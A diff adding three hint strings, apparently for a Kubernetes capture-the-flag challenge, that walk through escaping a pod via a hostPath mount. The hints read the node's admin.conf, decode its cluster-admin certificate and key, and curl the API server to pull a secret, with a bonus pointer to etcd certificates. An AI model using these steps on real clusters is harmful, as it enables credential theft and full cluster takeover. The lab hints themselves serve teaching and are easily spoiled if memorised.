@@ -1,0 +1,5 @@
+[
+  "The pod's own ServiceAccount is a dead end — `kubectl auth can-i get secrets -n dojo-vault --as=system:serviceaccount:dojo-steal:default` returns `no`. Stop trying to use the mounted token. Get a shell with `kubectl -n dojo-steal exec -it foothold -- bash` and look at what the `hostPath` mount exposes under `/host` — specifically `/host/etc/kubernetes/`.",
+  "Because this pod runs on the control-plane node, `/host/etc/kubernetes/admin.conf` is a full `cluster-admin` kubeconfig (its user is in group `system:masters`). The three base64 blobs you need are `client-certificate-data`, `client-key-data`, and `certificate-authority-data`. Decode each with `grep <field> admin.conf | awk '{print $2}' | base64 -d`.",
+  "`netshoot` has `curl` but not `kubectl`. Present the decoded cert/key/CA to the in-cluster API: `curl --cacert /tmp/ca.crt --cert /tmp/client.crt --key /tmp/client.key https://kubernetes.default.svc/api/v1/namespaces/dojo-vault/secrets/kingdom-keys`, then pull `.data.FLAG` and `base64 -d` it. (Bonus: etcd's certs are in `/host/etc/kubernetes/pki/etcd/` too — you can read the Secret straight from etcd.)"
+]
